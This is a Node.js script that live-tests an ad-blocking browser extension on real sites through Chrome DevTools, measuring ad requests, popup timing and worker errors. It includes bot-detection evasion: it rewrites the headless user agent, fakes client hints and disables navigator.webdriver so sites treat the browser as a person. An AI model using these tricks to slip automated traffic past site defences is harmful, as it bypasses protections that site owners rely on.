// Live run of the unpacked extension on real sites, in Chrome for Testing.
//
//   CHROME_PATH=<Chrome for Testing> node scripts/chrome-live.mjs --dir <extension folder>
//       [--chrome PATH] [--out DIR] [--only A,B] [--headful]
//
// Replaces the manual Chrome test list: no clicks and no input are needed.
// Two browsers run side by side, each with a new throwaway profile in the OS
// temp folder: one loads the extension (--dir, default the repository root),
// the baseline loads nothing. Checks compare the two, so a result is relative
// to the same page without the extension. Both browsers send a normal Chrome
// user agent (not HeadlessChrome) and hide navigator.webdriver, so sites treat
// the baseline like a person, not like a bot.
//   A  the toolbar popup opens on heavy news sites (cnn.com first), after the
//      page loaded and while it still loads (slow network); the worker answers
//      fast while cnn.com runs its request loop
//   B  ad and tracker requests on news articles, visible ad boxes (also in
//      cross-origin frames), the article; a blocked request repeated in a loop
//   C  ordinary sites still work (GitHub, React docs, Wikipedia, a shop)
//   D  YouTube watch page, not signed in: seconds to play, ad, toast; five
//      related videos one after the other; Share / Copy link, More, Save
//   E  Twitch and Kick live channel, not signed in: plays, ad marker
//   F  popup actions: Allow, Block again, Fix this site (No, No) on
//      foxnews.com and cnn.com, Fix this site (Yes) and Undo fix on foxnews.com
//   G  clipboard guard on a live page: bad command refused, plain text and
//      known safe commands written, Ctrl+C of a selection
//   X  service worker errors during the run
// Live network is used. No sign-in, no consent click, no bot-wall click: a
// wall gives SKIP. Each check has its own time limit and one retry; a failed
// site does not stop the others. A try that reaches its time limit is stopped.
// The run writes report.md, report.json and screenshots to --out (default: OS
// temp folder adgecko-live-<time>) and prints the report path.
// Exit code: 0 all checks PASS or SKIP; 1 a check FAILS, no check ran, or a
// throwaway profile was not removed; 2 a bad option; 130 stopped by Ctrl+C.
// Node 22 or later (global WebSocket). Not run in CI. Google Chrome 137 and
// later ignores --load-extension: use Chrome for Testing.
import { AsyncLocalStorage } from "node:async_hooks";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { openChrome } from "./lib/chrome-shot.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

// ---------- stop a try that reached its time limit ----------
// Each try runs inside its own store. When the time limit wins, the store is
// marked dead, and the next sleep or DevTools call of that try throws, so the
// old try cannot click, open tabs or close the popup of the next check.
const als = new AsyncLocalStorage();
const rawSleep = (ms) => new Promise((r) => setTimeout(r, ms));
function guard() {
  const a = als.getStore();
  if (a && a.dead) throw new Error("stopped: the time limit of this try was reached");
}
const sleep = async (ms) => {
  guard();
  await rawSleep(ms);
  guard();
};

// ---------- options ----------
function arg(name) {
  const i = process.argv.indexOf(name);
  return i > 0 ? process.argv[i + 1] || "" : null;
}
const EXT_DIR = path.resolve(arg("--dir") || ROOT);
const CHROME = arg("--chrome") || process.env.CHROME_PATH || "";
const HEADFUL = process.argv.includes("--headful");
const ONLY_RAW = arg("--only");
const ONLY = (ONLY_RAW || "").toUpperCase().split(",").map((s) => s.trim()).filter(Boolean);
const STAMP = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
const OUT = path.resolve(arg("--out") || path.join(os.tmpdir(), "adgecko-live-" + STAMP));
const SHOTS = path.join(OUT, "shots");
const want = (group) => !ONLY.length || ONLY.includes(group);
if (ONLY_RAW !== null) {
  const bad = ONLY.filter((g) => !/^[A-G]$/.test(g));
  if (bad.length || !ONLY.length) {
    console.error(`ERROR: --only takes group letters A to G, separated by commas (example: --only A,B). Not valid: ${bad.length ? bad.join(", ") : "(empty)"}`);
    process.exit(2);
  }
}

// ---------- sites ----------
const NEWS = [
  { id: "cnn", url: "https://www.cnn.com/" },
  { id: "foxnews", url: "https://www.foxnews.com/" },
  { id: "nbcnews", url: "https://www.nbcnews.com/" },
];
const ACTION_SITE = { id: "foxnews", url: "https://www.foxnews.com/" };
const ORDINARY = [
  { id: "github", url: "https://github.com/", main: "main" },
  { id: "react", url: "https://react.dev/", main: "main, article" },
  { id: "wikipedia", url: "https://en.wikipedia.org/wiki/Main_Page", main: "#mw-content-text" },
  { id: "shop-ikea", url: "https://www.ikea.com/us/en/", main: "main, #content" },
];
// Watch page used when the front page gives no video (it is empty when not signed in).
const YT_FALLBACK = "dQw4w9WgXcQ";
const CLIP_SITE = "https://en.wikipedia.org/wiki/Main_Page";
// A page on a host of the guard's safe list (install commands are written there).
const CLIP_SAFE_SITE = "https://python-poetry.org/docs/";

// Well-known ad and tracker hosts (a host or any subdomain of it).
const AD_HOSTS = [
  "doubleclick.net", "googlesyndication.com", "googleadservices.com", "adservice.google.com",
  "googletagservices.com", "amazon-adsystem.com", "taboola.com", "outbrain.com", "criteo.com",
  "criteo.net", "adnxs.com", "rubiconproject.com", "pubmatic.com", "openx.net", "casalemedia.com",
  "moatads.com", "adsrvr.org", "teads.tv", "3lift.com", "indexww.com", "smartadserver.com",
  "yieldmo.com", "sharethrough.com", "media.net", "bidswitch.net", "scorecardresearch.com",
  "adsafeprotected.com", "doubleverify.com", "2mdn.net", "quantserve.com", "demdex.net",
];
const isAdHost = (h) => AD_HOSTS.some((d) => h === d || h.endsWith("." + d));
// Common ad box selectors (visible ones are counted).
const AD_SELECTORS = [
  "ins.adsbygoogle", "iframe[id^='google_ads_iframe']", "div[id^='google_ads_iframe']",
  "iframe[src*='doubleclick.net']", "iframe[src*='googlesyndication']", "[id^='taboola-']",
  ".trc_related_container", ".OUTBRAIN", "[data-widget-id][class*='outbrain']", "[class*='ad-container']",
  "[class*='ad-slot']", "[id^='div-gpt-ad']", "[data-ad-slot]", ".adsbygoogle", "[class*='AdWrapper']",
  "[id*='ad-container']", "[class*='advert']",
].join(", ");
// Cookie and consent layers (OneTrust, Sourcepoint, Funding Choices, Quantcast).
const CONSENT_SELECTORS = "#onetrust-banner-sdk, #onetrust-consent-sdk, [id^='sp_message_container'], .fc-consent-root, #qc-cmp2-container, [id*='consent'][role=dialog]";

// What a person still has to test: the run cannot reach it.
const NOT_COVERED = [
  "The real toolbar click: A and F open the popup with chrome.action.openPopup() from the worker. UNVERIFIED for a click on the toolbar icon.",
  "A signed-in profile: Gmail and the signed-in YouTube checks (TODO.md section 0) need the owner's account. UNVERIFIED.",
  "The owner's PC, his Chrome version and his other extensions. UNVERIFIED.",
  "A consent banner is never clicked. On a site that holds its ads until consent, B gives SKIP.",
  "The YouTube premiere page: no stable upcoming premiere address exists.",
];

// ---------- report ----------
const report = { started: new Date().toISOString(), extensionDir: path.basename(EXT_DIR), env: {}, checks: [] };
function writeReport() {
  fs.mkdirSync(OUT, { recursive: true });
  fs.writeFileSync(path.join(OUT, "report.json"), JSON.stringify(report, null, 2));
  const env = report.env;
  const removed = env.profilesRemoved === undefined ? "" : `Throwaway profiles removed: ${env.profilesRemoved ? "yes" : "NO, remove them by hand"} (${(env.profiles || []).join(", ") || "none started"}).`;
  const lines = [
    "# Adgecko live run",
    "",
    `Started ${report.started}. Chrome ${env.chrome || "?"}. Extension ${env.extVersion || "?"} from folder \`${report.extensionDir}\`. ${HEADFUL ? "Headful" : "Headless"}.${ONLY.length ? " Groups: " + ONLY.join(", ") + "." : ""}`,
    env.userAgent ? `User agent sent by both browsers: ${env.userAgent}. navigator.webdriver: ${env.webdriver}.` : "",
    `List state at start: ${env.listStatus || "?"}`,
    "",
    env.workerErrors !== undefined ? `Service worker errors during the run: ${env.workerErrors}${env.workerErrorSample ? " (first: " + env.workerErrorSample + ")" : ""}` : "",
    report.interrupted ? "The run was stopped by Ctrl+C before the end." : "",
    report.finished ? `Finished ${report.finished} (${report.seconds} s). ${count("PASS")} PASS, ${count("FAIL")} FAIL, ${count("SKIP")} SKIP.` : "Running…",
    removed,
    "",
    "| Id | Result | Check | Detail |",
    "|---|---|---|---|",
    ...report.checks.map((c) => `| ${c.id} | ${c.status}${c.retried ? " (retry)" : ""} | ${c.title} | ${mdCell(c.line)} |`),
    "",
    "## Not covered by this run",
    "",
    ...NOT_COVERED.map((s) => "- " + s),
    "",
    "Screenshots are in `shots/`. report.json has every number and both tries of a retried check.",
    "",
  ];
  fs.writeFileSync(path.join(OUT, "report.md"), lines.join("\n").replace(/\n{3,}/g, "\n\n") + "\n");
}
const count = (s) => report.checks.filter((c) => c.status === s).length;
const mdCell = (s) => String(s || "").replace(/\|/g, "/").replace(/\n/g, " ");

// ---------- browsers ----------
let ext = null;
let base = null;
const workerErrors = [];
// The user agent override for every page and frame (set after the launch).
let UA = null;

async function launch(withExt) {
  const args = [
    "--autoplay-policy=no-user-gesture-required",
    "--window-size=1280,900",
    "--lang=en-US",
    // navigator.webdriver is false, as in a normal Chrome.
    "--disable-blink-features=AutomationControlled",
  ];
  if (withExt) args.push(`--disable-extensions-except=${EXT_DIR}`, `--load-extension=${EXT_DIR}`);
  const c = await openChrome(CHROME, args, { headless: !HEADFUL, profilePrefix: "adgecko-live-" });
  const send0 = c.send;
  // Every DevTools call gets a time limit: a call to a closed target can hang.
  c.send = (method, params = {}, sessionId, ms = 20000) => {
    guard();
    return Promise.race([send0(method, params, sessionId), rawSleep(ms).then(() => { throw new Error("timeout: " + method); })]);
  };
  return c;
}

// The normal Chrome user agent, made from the real one (headless says HeadlessChrome).
function makeUa(version) {
  const ua = version.userAgent.replace(/HeadlessChrome/g, "Chrome");
  const full = (version.product.split("/")[1] || "0.0.0.0");
  const major = full.split(".")[0];
  const brands = [{ brand: "Chromium", version: major }, { brand: "Google Chrome", version: major }, { brand: "Not_A Brand", version: "24" }];
  return {
    userAgent: ua,
    acceptLanguage: "en-US,en",
    platform: "Win32",
    userAgentMetadata: {
      brands, fullVersionList: brands.map((b) => ({ brand: b.brand, version: b.brand === "Not_A Brand" ? "24.0.0.0" : full })),
      fullVersion: full, platform: "Windows", platformVersion: "15.0.0", architecture: "x86", model: "", mobile: false, bitness: "64", wow64: false,
    },
  };
}

async function evalIn(c, sessionId, expression, ms = 20000) {
  const r = await c.send("Runtime.evaluate", { expression, awaitPromise: true, returnByValue: true }, sessionId, ms);
  if (r.exceptionDetails) throw new Error(r.exceptionDetails.exception ? r.exceptionDetails.exception.description : r.exceptionDetails.text);
  return r.result.value;
}

// The worker can stop and start again, so look for it on each use.
let swSession = null;
let swTarget = null;
async function worker() {
  const { targetInfos } = await ext.send("Target.getTargets");
  const t = targetInfos.find((x) => x.type === "service_worker" && x.url.endsWith("/src/general-background.js"));
  if (!t) throw new Error("no service worker target");
  if (swTarget !== t.targetId || !swSession) {
    swSession = (await ext.send("Target.attachToTarget", { targetId: t.targetId, flatten: true })).sessionId;
    swTarget = t.targetId;
    await ext.send("Runtime.enable", {}, swSession).catch(() => {});
  }
  return swSession;
}
async function swEval(expr, ms) {
  for (let i = 0; i < 3; i++) {
    try {
      const s = await worker();
      return await evalIn(ext, s, expr, ms);
    } catch (e) {
      guard();
      swSession = null;
      if (i === 2) throw e;
      await sleep(500);
    }
  }
}

// ---------- pages ----------
// Opens a tab, records every request (also from cross-origin frames) and
// extension errors, and navigates. It does not wait for the load event.
// throttle: slow network for this tab (the page keeps loading for a while).
async function openPage(c, url, attempt, { width = 1280, height = 900, focus = false, throttle = false } = {}) {
  guard();
  const { targetId } = await c.send("Target.createTarget", { url: "about:blank" });
  // In the list at once, so the runner closes the tab even if a later step fails.
  const page = { c, targetId, sessionId: null, sessions: new Set(), frames: new Set(), reqs: new Map(), extErrors: [], loaded: false, committed: false, t0: 0, uaHeaders: { headless: 0, seen: 0 } };
  attempt.pages.push(page);
  const { sessionId } = await c.send("Target.attachToTarget", { targetId, flatten: true });
  page.sessionId = sessionId;
  page.sessions.add(sessionId);
  const extId = (s) => /chrome-extension:\/\//.test(s || "");
  page.off = c.on((m) => {
    if (!m.sessionId || !page.sessions.has(m.sessionId)) return;
    const p = m.params || {};
    switch (m.method) {
      case "Target.attachedToTarget": {
        const s = p.sessionId;
        page.sessions.add(s);
        if (p.targetInfo && p.targetInfo.type === "iframe") page.frames.add(s);
        // DevTools runs the calls of one session in order: the user agent is
        // set before the frame or worker starts.
        if (UA) c.send("Network.setUserAgentOverride", UA, s).catch(() => {});
        c.send("Network.enable", {}, s).catch(() => {});
        c.send("Runtime.enable", {}, s).catch(() => {});
        if (throttle) c.send("Network.emulateNetworkConditions", THROTTLE, s).catch(() => {});
        c.send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: true, flatten: true }, s).catch(() => {});
        c.send("Runtime.runIfWaitingForDebugger", {}, s).catch(() => {});
        break;
      }
      case "Target.detachedFromTarget":
        page.frames.delete(p.sessionId);
        break;
      case "Network.requestWillBeSent": {
        const k = m.sessionId + "|" + p.requestId;
        const r = page.reqs.get(k);
        if (r) r.url = p.request.url;
        else page.reqs.set(k, { url: p.request.url, first: p.request.url, st: "pending", type: p.type });
        const h = p.request.headers || {};
        const ua = h["User-Agent"] || h["user-agent"];
        if (ua) { page.uaHeaders.seen++; if (/HeadlessChrome/.test(ua)) page.uaHeaders.headless++; }
        break;
      }
      case "Network.responseReceived": {
        const r = page.reqs.get(m.sessionId + "|" + p.requestId);
        if (r && r.st === "pending") r.st = "ok";
        break;
      }
      case "Network.loadingFinished": {
        const r = page.reqs.get(m.sessionId + "|" + p.requestId);
        if (r) r.st = "ok";
        break;
      }
      case "Network.loadingFailed": {
        const r = page.reqs.get(m.sessionId + "|" + p.requestId);
        if (r && r.st !== "ok") r.st = /BLOCKED_BY_CLIENT/.test(p.errorText) ? "blocked" : "failed";
        break;
      }
      case "Page.frameNavigated":
        if (m.sessionId === sessionId && !p.frame.parentId && /^https?:/.test(p.frame.url) && !page.committed) page.committed = Date.now();
        break;
      case "Page.loadEventFired":
        if (m.sessionId === sessionId) page.loaded = true;
        break;
      case "Runtime.exceptionThrown": {
        const d = p.exceptionDetails || {};
        const text = (d.exception && d.exception.description) || d.text || "";
        if (extId(d.url) || extId(text) || (d.stackTrace && d.stackTrace.callFrames.some((f) => extId(f.url)))) page.extErrors.push(text.slice(0, 200));
        break;
      }
      case "Runtime.consoleAPICalled": {
        if (p.type !== "error") break;
        const text = (p.args || []).map((a) => a.value || a.description || "").join(" ");
        if (extId(text) || (p.stackTrace && p.stackTrace.callFrames.some((f) => extId(f.url)))) page.extErrors.push(text.slice(0, 200));
        break;
      }
      case "Log.entryAdded": {
        const e = p.entry || {};
        if (e.level === "error" && (extId(e.url) || extId(e.text))) page.extErrors.push(String(e.text).slice(0, 200));
        break;
      }
    }
  });
  await c.send("Page.enable", {}, sessionId);
  await c.send("Network.enable", {}, sessionId);
  if (UA) await c.send("Network.setUserAgentOverride", UA, sessionId);
  if (throttle) await c.send("Network.emulateNetworkConditions", THROTTLE, sessionId).catch((e) => { page.throttleError = e.message; });
  await c.send("Runtime.enable", {}, sessionId);
  await c.send("Log.enable", {}, sessionId).catch(() => {});
  await c.send("Emulation.setDeviceMetricsOverride", { width, height, deviceScaleFactor: 1, mobile: false }, sessionId);
  if (focus) await c.send("Emulation.setFocusEmulationEnabled", { enabled: true }, sessionId);
  await c.send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: true, flatten: true }, sessionId);
  page.t0 = Date.now();
  if (url) await c.send("Page.navigate", { url }, sessionId, 30000).catch((e) => { guard(); page.navError = e.message; });
  return page;
}
// About 400 kbit/s with 300 ms latency: a heavy news page loads for a long time.
const THROTTLE = { offline: false, latency: 300, downloadThroughput: 50000, uploadThroughput: 50000 };

async function reloadPage(page) {
  page.reqs.clear();
  page.extErrors.length = 0;
  page.loaded = false;
  page.t0 = Date.now();
  await page.c.send("Page.reload", { ignoreCache: true }, page.sessionId, 30000).catch((e) => { guard(); page.navError = e.message; });
}

// Runs outside a try (the runner), so it works after the time limit too.
async function closePage(page) {
  if (page.closed) return;
  page.closed = true;
  try { if (page.off) page.off(); } catch { /* gone */ }
  await page.c.send("Target.closeTarget", { targetId: page.targetId }, undefined, 5000).catch(() => {});
}

async function waitLoad(page, ms) {
  const end = Date.now() + ms;
  while (!page.loaded && Date.now() < end) await sleep(200);
  return page.loaded;
}

// Request numbers for the well-known ad and tracker hosts. blockedAll counts
// every request the extension blocked (any host).
function adStats(page) {
  const s = { total: page.reqs.size, ad: 0, ok: 0, blocked: 0, failed: 0, pending: 0, blockedAll: 0, hosts: {}, loop: 0, loopUrl: "" };
  const repeat = new Map();
  for (const r of page.reqs.values()) {
    let host = "";
    let key = "";
    try {
      const u = new URL(r.first);
      host = u.hostname;
      key = u.hostname + u.pathname;
    } catch { continue; }
    const redirected = r.st === "ok" && /^chrome-extension:/.test(r.url);
    if (r.st === "blocked" || redirected) s.blockedAll++;
    if (r.st === "blocked") repeat.set(key, (repeat.get(key) || 0) + 1);
    if (!isAdHost(host)) continue;
    s.ad++;
    // A DNR redirect to a stand-in file counts as blocked.
    const st = redirected ? "blocked" : r.st;
    s[st]++;
    if (st === "ok") s.hosts[host] = (s.hosts[host] || 0) + 1;
  }
  for (const [k, n] of repeat) if (n > s.loop) { s.loop = n; s.loopUrl = k; }
  return s;
}

const PAGE_INFO = `(() => {
  const vis = (el) => { if (!el) return false; const r = el.getBoundingClientRect(); const cs = getComputedStyle(el); return r.width > 2 && r.height > 2 && cs.display !== "none" && cs.visibility !== "hidden" && cs.opacity !== "0"; };
  const text = document.body ? document.body.innerText : "";
  const title = document.title || "";
  const wall = /just a moment|verify you are human|are you a robot|access denied|captcha|unusual traffic|sign in to confirm/i.test(title + " " + text.slice(0, 600));
  const consent = [...document.querySelectorAll(${JSON.stringify(CONSENT_SELECTORS)})].some(vis);
  return { title: title.slice(0, 80), url: location.href, textLen: text.length, height: document.documentElement.scrollHeight, wall, consent };
})()`;
async function pageInfo(page) {
  try { return await evalIn(page.c, page.sessionId, PAGE_INFO, 10000); } catch (e) { guard(); return { error: e.message, textLen: 0, height: 0 }; }
}

async function shot(page, name) {
  try {
    fs.mkdirSync(SHOTS, { recursive: true });
    const { data } = await page.c.send("Page.captureScreenshot", { format: "png" }, page.sessionId, 15000);
    const file = path.join(SHOTS, name + ".png");
    fs.writeFileSync(file, Buffer.from(data, "base64"));
    return "shots/" + name + ".png";
  } catch {
    guard();
    return "";
  }
}

// A real mouse click in the middle of the element that the expression finds.
async function clickEl(c, sid, findExpr) {
  const r = await evalIn(c, sid, `(() => { const el = (${findExpr}); if (!el) return null; el.scrollIntoView({ block: "center" }); const b = el.getBoundingClientRect(); return b.width && b.height ? { x: b.x + b.width / 2, y: b.y + b.height / 2 } : null; })()`, 5000).catch(() => null);
  if (!r) return false;
  await sleep(150);
  for (const type of ["mousePressed", "mouseReleased"]) await c.send("Input.dispatchMouseEvent", { type, x: r.x, y: r.y, button: "left", clickCount: 1 }, sid);
  return true;
}

// ---------- popup ----------
let popupOffs = [];
async function popupTargets() {
  const { targetInfos } = await ext.send("Target.getTargets");
  return targetInfos.filter((t) => t.url.endsWith("/src/popup.html"));
}
async function closePopups() {
  for (const off of popupOffs) off();
  popupOffs = [];
  for (const t of await popupTargets()) await ext.send("Target.closeTarget", { targetId: t.targetId }, undefined, 5000).catch(() => {});
  for (let i = 0; i < 25 && (await popupTargets()).length; i++) await sleep(200);
}
const POPUP_STATE = `(() => {
  const g = (id) => document.getElementById(id);
  const shown = (id) => !!g(id) && !g(id).hidden;
  return {
    host: g("site-host").textContent, status: g("site-status").textContent,
    fixShown: shown("fix-site"), fixOn: shown("fix-site") && !g("fix-site").disabled,
    allowOn: !g("allow-site").disabled, allowText: g("allow-site").textContent,
    askShown: shown("fix-ask"), scope: g("fix-scope") ? g("fix-scope").textContent : "",
    listsShown: shown("fix-lists"), undoShown: shown("undo-fix"), note: g("fix-note").textContent,
  };
})()`;
// Opens the popup with chrome.action.openPopup() from the worker (not a
// toolbar click) and times three moments: the popup target exists, the popup
// names the page host, the buttons are enabled. Errors of popup.js after the
// attach (and the ones DevTools replays on Runtime.enable) go to popupErrors.
async function openPopup(page, host, { readyMs = 15000 } = {}) {
  await closePopups();
  await ext.send("Target.activateTarget", { targetId: page.targetId });
  await sleep(150);
  const t0 = Date.now();
  let openErr = "";
  swEval("chrome.action.openPopup().then(() => 'ok', (e) => 'error: ' + e.message)", 15000).then((r) => { if (r !== "ok") openErr = r; }, (e) => { openErr = e.message; });
  let target = null;
  while (!target && Date.now() - t0 < readyMs) {
    target = (await popupTargets())[0];
    if (!target) await sleep(100);
  }
  const res = { targetMs: target ? Date.now() - t0 : null, hostMs: null, readyMs: null, openErr, state: null, session: null, popupErrors: [] };
  if (!target) return res;
  const ps = (await ext.send("Target.attachToTarget", { targetId: target.targetId, flatten: true })).sessionId;
  res.session = ps;
  popupOffs.push(ext.on((m) => {
    if (m.sessionId !== ps) return;
    if (m.method === "Runtime.exceptionThrown") { const d = m.params.exceptionDetails || {}; res.popupErrors.push(((d.exception && d.exception.description) || d.text || "").slice(0, 200)); }
    if (m.method === "Runtime.consoleAPICalled" && m.params.type === "error") res.popupErrors.push((m.params.args || []).map((a) => a.value || a.description || "").join(" ").slice(0, 200));
  }));
  await ext.send("Runtime.enable", {}, ps).catch(() => {});
  await ext.send("Page.enable", {}, ps).catch(() => {});
  await ext.send("Emulation.setDeviceMetricsOverride", { width: 380, height: 600, deviceScaleFactor: 1, mobile: false }, ps).catch(() => {});
  while (Date.now() - t0 < readyMs) {
    try { res.state = await evalIn(ext, ps, POPUP_STATE, 5000); } catch (e) { guard(); res.state = { error: e.message }; }
    if (res.state && res.state.host === host && res.hostMs === null) res.hostMs = Date.now() - t0;
    if (res.hostMs !== null && res.state.allowOn && (res.state.fixOn || !res.state.fixShown)) {
      res.readyMs = Date.now() - t0;
      break;
    }
    await sleep(100);
  }
  res.openErr = openErr;
  return res;
}
const popupPage = (ps) => ({ c: ext, sessionId: ps });
async function popupClick(ps, id) {
  return evalIn(ext, ps, `(() => { const b = document.getElementById(${JSON.stringify(id)}); if (!b || b.hidden || b.disabled) return false; b.click(); return true; })()`);
}
async function poll(fn, ms, step = 250) {
  const end = Date.now() + ms;
  let v;
  while (Date.now() < end) {
    try { v = await fn(); } catch { guard(); v = undefined; }
    if (v) return v;
    await sleep(step);
  }
  return v;
}
const overridesOf = (host) => swEval(`chrome.storage.local.get('siteOverrides').then((s) => (s.siteOverrides || {})[${JSON.stringify(host)}] || null)`);
const allowRuleFor = (host) => swEval(`chrome.declarativeNetRequest.getDynamicRules().then((rs) => rs.some((r) => r.action.type === 'allow' && (r.condition.initiatorDomains || []).includes(${JSON.stringify(host)})))`);

// Puts the host back to the state of a fresh install: no override entry, no
// open Fix question, no allow rule. The worker rebuilds its rules from storage
// (storage.onChanged); a rule that stays after 10 s is removed here.
async function resetSite(host) {
  const h = JSON.stringify(host);
  await swEval(`chrome.storage.local.get(['siteOverrides', 'popupFix']).then(async (s) => {
    const o = Object.assign({}, s.siteOverrides || {});
    delete o[${h}];
    const set = { siteOverrides: o };
    const f = s.popupFix;
    if (f && f.others) delete f.others[${h}];
    if (f && f.host === ${h}) {
      const rest = Object.keys(f.others || {});
      if (rest.length) { const top = rest[0]; const v = Object.assign({ host: top }, f.others[top]); delete f.others[top]; if (Object.keys(f.others).length) v.others = f.others; set.popupFix = v; }
      else await chrome.storage.local.remove('popupFix');
    } else if (f) set.popupFix = f;
    await chrome.storage.local.set(set);
    return true;
  })`);
  let gone = await poll(async () => !(await allowRuleFor(host)), 10000);
  if (!gone) {
    await swEval(`chrome.declarativeNetRequest.getDynamicRules().then((rs) => chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: rs.filter((r) => r.action.type === 'allow' && (r.condition.initiatorDomains || []).includes(${h})).map((r) => r.id) })).then(() => true)`);
    gone = await poll(async () => !(await allowRuleFor(host)), 5000);
  }
  if (!gone) throw new Error("reset of " + host + " failed: the allow rule stays");
  return true;
}

// ---------- check runner ----------
// fn(attempt) returns { status: PASS|FAIL|SKIP, line, data }. A FAIL or an
// error gets one more try; both tries stay in report.json. cleanup() runs
// after every try, outside the try, so it also runs after the time limit.
// Test hook: ADGECKO_LIVE_TEST_LIMIT_MS=<ms> lowers every time limit (to test the stop of a try).
const LIMIT_CAP = Number(process.env.ADGECKO_LIVE_TEST_LIMIT_MS) || 0;
// Tabs still open in both browsers (the first blank tab of each is not counted).
async function openTabs() {
  const n = [];
  for (const c of [ext, base]) {
    if (!c) continue;
    const { targetInfos } = await c.send("Target.getTargets").catch(() => ({ targetInfos: [] }));
    n.push(targetInfos.filter((t) => t.type === "page" && t.url !== "about:blank").length);
  }
  return n;
}
async function check(id, title, ms, fn, cleanup) {
  if (LIMIT_CAP) ms = Math.min(ms, LIMIT_CAP);
  const tries = [];
  for (let n = 1; n <= 2; n++) {
    const attempt = { pages: [], dead: false };
    const t0 = Date.now();
    const TIMEOUT = {};
    const run = als.run(attempt, () => Promise.resolve().then(() => fn(attempt, n)));
    let r;
    try {
      r = await Promise.race([run, rawSleep(ms).then(() => TIMEOUT)]);
    } catch (e) {
      r = { status: "FAIL", line: "error: " + (e && e.message || e) };
    }
    if (r === TIMEOUT) {
      attempt.dead = true;
      r = { status: "FAIL", line: `time limit ${ms / 1000} s reached` };
      // The old try stops at its next sleep or DevTools call.
      r.stopped = await Promise.race([run.then(() => "yes", () => "yes"), rawSleep(10000).then(() => "no, still running after 10 s")]);
    }
    for (const p of attempt.pages) await closePage(p);
    if (ext) await closePopups().catch(() => {});
    if (cleanup) {
      try { await cleanup(); } catch (e) { r.cleanupError = e.message; if (r.status !== "FAIL") { r.status = "FAIL"; r.line = "cleanup failed: " + e.message + "; " + r.line; } }
    }
    r.seconds = Math.round((Date.now() - t0) / 100) / 10;
    r.openTabsAfter = await openTabs();
    tries.push(r);
    if (r.status !== "FAIL") break;
  }
  const last = tries[tries.length - 1];
  const entry = { id, title, status: last.status, line: last.line, retried: tries.length > 1, tries };
  if (entry.retried) {
    entry.line = (last.status === "PASS" ? "PASS on retry (first try: " : last.status === "SKIP" ? "SKIP on retry (first try: " : "both tries failed (first try: ") + tries[0].line + "). " + last.line;
  }
  report.checks.push(entry);
  console.log(`${entry.status.padEnd(4)}  ${id}  ${title}  (${entry.line})`);
  writeReport();
  return entry;
}

// ---------- A: popup on heavy news sites ----------
// when: "loaded" (load event + 3 s) or "loading" (slow network; the popup
// opens as soon as the page address is committed, before the load event).
const VIA = "(opened by chrome.action.openPopup, not a toolbar click)";
async function checkPopup(site, when) {
  const host = new URL(site.url).hostname;
  const id = `A-${site.id}-${when}`;
  const words = { loading: "while the page still loads (slow network)", loaded: "after the page loaded" };
  return check(id, `popup opens on ${host} ${words[when]} ${VIA}`, 90000, async (at, n) => {
    const loading = when === "loading";
    const page = await openPage(ext, site.url, at, { throttle: loading });
    if (loading) {
      const end = Date.now() + 30000;
      while (!page.committed && Date.now() < end) await sleep(50);
      if (!page.committed) return { status: "SKIP", line: "the page address was not committed in 30 s on the slow network, loading case not tested" + (page.throttleError ? " (" + page.throttleError + ")" : "") };
    } else {
      await waitLoad(page, 20000);
      await sleep(3000);
    }
    const info = await pageInfo(page);
    if (info.wall) return { status: "SKIP", line: "bot wall: " + info.title };
    const loadedAtPopup = page.loaded;
    const p = await openPopup(page, host);
    const name = `${id}-try${n}`;
    const shotFile = p.session ? await shot(popupPage(p.session), name + "-popup") : await shot(page, name + "-page");
    const nums = `target ${ms(p.targetMs)}, host shown ${ms(p.hostMs)}, buttons ready ${ms(p.readyMs)}; page load event ${loadedAtPopup ? "fired" : "not yet"} at popup time${loading ? ", " + ((Date.now() - page.t0) / 1000).toFixed(1) + " s after the start" : ""}; popup errors ${p.popupErrors.length}${p.popupErrors.length ? ": " + p.popupErrors[0] : ""}; ${shotFile}`;
    const data = { popup: p, info, requests: page.reqs.size, shot: shotFile, loadedAtPopup };
    if (p.targetMs === null) return { status: "FAIL", line: `popup did not open in 15 s (${p.openErr || "no error"}); ${nums}`, data };
    if (p.readyMs === null) return { status: "FAIL", line: `popup opened but showed "${p.state && p.state.host}" / "${p.state && p.state.status}" for 15 s; ${nums}`, data };
    if (loading && loadedAtPopup) return { status: "SKIP", line: "the page finished loading before the popup, loading case not tested; " + nums, data };
    const why = [!(p.targetMs <= 3000 && p.readyMs <= 5000) && "too slow (limit: target 3 s, ready 5 s)", p.popupErrors.length && "popup.js errors"].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + nums, data };
  });
}
const ms = (v) => (v === null || v === undefined ? "never" : (v / 1000).toFixed(1) + " s");

// The worker round trip while cnn.com runs its loop of blocked requests (the
// likely cause of a popup that does not open on a toolbar click), then the popup.
async function checkBusy(site) {
  const host = new URL(site.url).hostname;
  return check(`A-${site.id}-busy`, `worker answers in under 2 s and the popup opens while ${host} runs for 15 s ${VIA}`, 90000, async (at, n) => {
    const page = await openPage(ext, site.url, at);
    const rtts = [];
    const end = Date.now() + 15000;
    while (Date.now() < end) {
      const t = Date.now();
      try { await swEval("1", 10000); rtts.push(Date.now() - t); } catch { guard(); rtts.push(10000); }
      await sleep(1000);
    }
    const st = adStats(page);
    const p = await openPopup(page, host);
    const shotFile = p.session ? await shot(popupPage(p.session), `A-${site.id}-busy-try${n}-popup`) : "";
    const sorted = [...rtts].sort((a, b) => a - b);
    const maxRtt = sorted[sorted.length - 1] || 0;
    const median = sorted[Math.floor(sorted.length / 2)] || 0;
    const nums = `worker round trip: median ${median} ms, max ${maxRtt} ms over ${rtts.length} samples; ${st.total} requests, ${st.blockedAll} blocked (most repeated: ${st.loopUrl || "none"} x ${st.loop}); popup target ${ms(p.targetMs)}, buttons ready ${ms(p.readyMs)}; popup errors ${p.popupErrors.length}; ${shotFile}`;
    const data = { rtts, stats: st, popup: p };
